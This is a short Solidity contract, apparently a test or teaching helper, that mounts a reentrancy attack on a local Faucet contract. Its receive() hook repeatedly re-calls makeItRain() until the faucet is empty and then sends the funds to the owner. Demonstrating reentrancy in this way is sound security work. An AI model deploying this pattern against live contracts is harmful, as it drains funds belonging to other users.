// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

import "../Faucet.sol";

contract FaucetReentrancyAttacker {
  Faucet private immutable faucetContract;
  address private owner;

  constructor(Faucet _faucetConTractAddress) {
    faucetContract = _faucetConTractAddress;
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(owner == msg.sender, "Only the owner can attack.");
    _;
  }

  function attack() external payable onlyOwner {
    faucetContract.makeItRain();
  }

  receive() external payable {
    if (address(faucetContract).balance > 0) {
      faucetContract.makeItRain();
    } else {
      payable(owner).transfer(address(this).balance);
    }
  }
}
